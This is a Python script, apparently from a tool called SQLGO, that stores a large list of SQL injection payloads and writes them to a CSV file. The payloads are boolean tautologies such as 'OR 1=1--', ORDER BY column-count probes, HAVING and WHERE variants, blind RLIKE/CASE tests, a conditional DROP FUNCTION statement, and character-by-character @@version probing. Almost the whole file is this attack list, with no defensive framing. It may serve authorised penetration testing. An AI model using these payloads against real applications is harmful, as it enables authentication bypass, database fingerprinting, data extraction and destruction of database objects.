"""
# SQLGO License - Version 1.1

Copyright (C) 2023-2024 Heisenberg

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.


"""

import csv

# SQL query patterns
sql_patterns = [
    "OR 1=1",
    "OR 1=0",
    "OR x=x",
    "OR x=y",
    "OR 1=1#",
    "OR 1=0#",
    "OR x=x#",
    "OR x=y#",
    "OR 1=1--",
    "OR 1=0--",
    "OR x=x--",
    "OR x=y--",
    "OR 3409=3409 AND ('pytW' LIKE 'pytW",
    "OR 3409=3409 AND ('pytW' LIKE 'pytY",
    "HAVING 1=1",
    "HAVING 1=0",
    "HAVING 1=1#",
    "HAVING 1=0#",
    "HAVING 1=1--",
    "HAVING 1=0--",
    "AND 1=1",
    "AND 1=0",
    "AND 1=1--",
    "AND 1=0--",
    "AND 1=1#",
    "AND 1=0#",
    "AND 1=1 AND '%'='",
    "AND 1=0 AND '%'='",
    "AND 1083=1083 AND (1427=1427",
    "AND 7506=9091 AND (5913=5913",
    "AND 1083=1083 AND ('1427=1427",
    "AND 7506=9091 AND ('5913=5913",
    "AND 7300=7300 AND 'pKlZ'='pKlZ",
    "AND 7300=7300 AND 'pKlZ'='pKlY",
    "AND 7300=7300 AND ('pKlZ'='pKlZ",
    "AND 7300=7300 AND ('pKlZ'='pKlY",
    "AS INJECTX WHERE 1=1 AND 1=1",
    "AS INJECTX WHERE 1=1 AND 1=0",
    "AS INJECTX WHERE 1=1 AND 1=1#",
    "AS INJECTX WHERE 1=1 AND 1=0#",
    "AS INJECTX WHERE 1=1 AND 1=1--",
    "AS INJECTX WHERE 1=1 AND 1=0--",
    "WHERE 1=1 AND 1=1",
    "WHERE 1=1 AND 1=0",
    "WHERE 1=1 AND 1=1#",
    "WHERE 1=1 AND 1=0#",
    "WHERE 1=1 AND 1=1--",
    "WHERE 1=1 AND 1=0--",
    "ORDER BY 1--",
    "ORDER BY 2--",
    "ORDER BY 3--",
    "ORDER BY 4--",
    "ORDER BY 5--",
    "ORDER BY 6--",
    "ORDER BY 7--",
    "ORDER BY 8--",
    "ORDER BY 9--",
    "ORDER BY 10--",
    "ORDER BY 11--",
    "ORDER BY 12--",
    "ORDER BY 13--",
    "ORDER BY 14--",
    "ORDER BY 15--",
    "ORDER BY 16--",
    "ORDER BY 17--",
    "ORDER BY 18--",
    "ORDER BY 19--",
    "ORDER BY 20--",
    "ORDER BY 21--",
    "ORDER BY 22--",
    "ORDER BY 23--",
    "ORDER BY 24--",
    "ORDER BY 25--",
    "ORDER BY 26--",
    "ORDER BY 27--",
    "ORDER BY 28--",
    "ORDER BY 29--",
    "ORDER BY 30--",
    "ORDER BY 31337--",
    "ORDER BY 1#",
    "ORDER BY 2#",
    "ORDER BY 3#",
    "ORDER BY 4#",
    "ORDER BY 5#",
    "ORDER BY 6#",
    "ORDER BY 7#",
    "ORDER BY 8#",
    "ORDER BY 9#",
    "ORDER BY 10#",
    "ORDER BY 11#",
    "ORDER BY 12#",
    "ORDER BY 13#",
    "ORDER BY 14#",
    "ORDER BY 15#",
    "ORDER BY 16#",
    "ORDER BY 17#",
    "ORDER BY 18#",
    "ORDER BY 19#",
    "ORDER BY 20#",
    "ORDER BY 21#",
    "ORDER BY 22#",
    "ORDER BY 23#",
    "ORDER BY 24#",
    "ORDER BY 25#",
    "ORDER BY 26#",
    "ORDER BY 27#",
    "ORDER BY 28#",
    "ORDER BY 29#",
    "ORDER BY 30#",
    "ORDER BY 31337#",
    "ORDER BY 1",
    "ORDER BY 2",
    "ORDER BY 3",
    "ORDER BY 4",
    "ORDER BY 5",
    "ORDER BY 6",
    "ORDER BY 7",
    "ORDER BY 8",
    "ORDER BY 9",
    "ORDER BY 10",
    "ORDER BY 11",
    "ORDER BY 12",
    "ORDER BY 13",
    "ORDER BY 14",
    "ORDER BY 15",
    "ORDER BY 16",
    "ORDER BY 17",
    "ORDER BY 18",
    "ORDER BY 19",
    "ORDER BY 20",
    "ORDER BY 21",
    "ORDER BY 22",
    "ORDER BY 23",
    "ORDER BY 24",
    "ORDER BY 25",
    "ORDER BY 26",
    "ORDER BY 27",
    "ORDER BY 28",
    "ORDER BY 29",
    "ORDER BY 30",
    "ORDER BY 31337",
    "RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
    "RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
    "IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--",
    "IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--",
    "' AND 8310=8310 AND '%'='",
    "' AND 8310=8311 AND '%'='",
    " and (select substring(@@version,1,1))='X'",
    " and (select substring(@@version,1,1))='M'",
    " and (select substring(@@version,2,1))='i'",
    " and (select substring(@@version,2,1))='y'",
    " and (select substring(@@version,3,1))='c'",
    " and (select substring(@@version,3,1))='S'",
    " and (select substring(@@version,3,1))='X'"
]

# Specify the file name
csv_file_name = 'sql_query_patterns.csv'

# Write the SQL patterns to a CSV file
with open(csv_file_name, mode='w', newline='') as csv_file:
    csv_writer = csv.writer(csv_file)
    
    # Write header
    csv_writer.writerow(['SQL Query Patterns'])
    
    # Write each SQL pattern
    for sql_pattern in sql_patterns:
        csv_writer.writerow([sql_pattern])

print(f'CSV file "{csv_file_name}" generated successfully.')
